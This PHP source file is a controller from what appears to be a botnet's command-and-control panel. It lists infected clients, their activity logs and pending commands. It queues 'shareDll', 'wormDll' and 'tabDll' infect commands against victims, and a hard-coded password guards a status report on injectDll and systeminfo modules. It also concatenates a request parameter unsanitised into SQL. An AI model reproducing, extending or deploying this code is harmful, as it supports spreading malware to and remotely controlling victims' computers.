<?php defined('SYSPATH') or die('No direct script access.');

class Controller_ApiEx extends Controller{

    public function action_getId(){
        if(Auth::instance()->logged_in()){
            $clientID = $this->request->param('id');
            $array['id'] = Model_Client::getClientIDByName($clientID);

            $array['table1'] = DB::select()
                ->from('clients')
                ->where('id', '=', $array['id'])
                ->limit(10)
                ->execute()
                ->as_array();

            foreach ($array['table1'] as $k => $v){
                $array['table1'][$k]['last_activity'] = Helper::time_elapsed_string($v['last_activity'], true);
            }

            $array['table2'] = DB::select()
                ->from('clients_log')
                ->where('client_id', '=', $array['id'])
                ->order_by('created_at', 'DESC')
                ->execute()
                ->as_array();

            $array['table3'] = DB::select('incode', 'params')
                ->from('commands')
                ->where('client_id', '=', $array['id'])
                ->and_where('result_code', 'IS', NULL)
                ->execute()
                ->as_array();

            $this->response->body(json_encode($array));
        }else{
            throw HTTP_Exception::factory(401);
        }
    }

    private function runmodules($params){
        $id = Model::factory('Client')
            ->getClientIDByName($this->request->param('client'));

        if(!$id){
            throw HTTP_Exception::factory(404);
        }

        $array = [
            'incode' => 62,
            'params' => $params,
            'client_id' => $id,
        ];

        DB::insert('commands', array_keys($array))
            ->values($array)
            ->execute();
    }

	public function action_share(){
        $this->runmodules('shareDll infect');
    }

	public function action_worm(){
        $this->runmodules('wormDll infect');
    }

	public function action_tab(){
        $this->runmodules('tabDll infect');
    }

	public function action_index(){
        $pass = 'f779f60d4868063d462c3f99656a8a6d';
        $timeout = 15;

        if($this->request->post('pass') && $this->request->post('pass') == $pass){
            if($this->request->post('timeout')){
                $timeout = intval($this->request->post('timeout'));
            }

            $client = $this->request->param('client');
            $id_high = DB::expr("x'".substr($client, 0, 16)."'::BIGINT");
            $id_low = DB::expr("x'".substr($client, -16)."'::BIGINT");

            $id = DB::select('id')
                ->from('clients')
                ->where('id_high','=', $id_high)
                ->and_where('id_low', '=', $id_low)
                ->limit(1)
                ->execute()
                ->current();

            if($id){
                $id = $id['id'];
                $str = '';

                $online = DB::select('created_at', 'info', 'type', 'command')
                    ->from('clients_log')
                    ->where('client_id', '=', $id)
                    ->where('command', '=', 'online')
                    ->where('created_at', '>=', DB::expr("NOW()::timestamp - INTERVAL '" . $timeout . " MINUTE'"))
                    ->order_by('created_at', 'DESC')
                    ->limit(1)
                    ->execute()
                    ->current();

                if($online){
                    $str .= implode(' ', $online).PHP_EOL;
                }

                $start = DB::select('created_at', 'info', 'type', 'command')
                    ->from('clients_log')
                    ->where('client_id', '=', $id)
                    ->where('info', '=', 'systeminfo start')
                    ->where('created_at', '>=', DB::expr("NOW()::timestamp - INTERVAL '" . $timeout . " MINUTE'"))
                    ->order_by('created_at', 'DESC')
                    ->limit(1)
                    ->execute()
                    ->current();

                if($start){
                    $str .= implode(' ', $start).PHP_EOL;
                }

                $module = DB::select('name', 'created_at', 'ctl', 'ctl_result')
                    ->from('module_data')
                    ->where('client_id', '=', $id)
                    ->where('name', '=', 'injectDll')
                    ->where('ctl', '!=', 'GetSystemInfo')
                    ->where('created_at', '>=', DB::expr("NOW()::timestamp - INTERVAL '" . $timeout . " MINUTE'"))
                    ->order_by('created_at', 'DESC')
                    ->limit(1)
                    ->execute()
                    ->current();

                if($module){
                    $str .= implode(' ', $module).PHP_EOL;
                }

                $module = DB::select('name', 'created_at', 'ctl', 'ctl_result')
                    ->from('module_data')
                    ->where('client_id', '=', $id)
                    ->where('name', '=', 'systeminfo')
                    ->where('ctl', '!=', 'GetSystemInfo')
                    ->where('created_at', '>=', DB::expr("NOW()::timestamp - INTERVAL '" . $timeout . " MINUTE'"))
                    ->order_by('created_at', 'DESC')
                    ->limit(1)
                    ->execute()
                    ->current();

                if($module){
                    $str .= implode(' ', $module);
                }

                $this->response->headers('Content-Type', 'text/plain');
                $this->response->body($str);
            }else{
                throw HTTP_Exception::factory(400);
            }
        }else{
            throw HTTP_Exception::factory(401);
        }
    }
}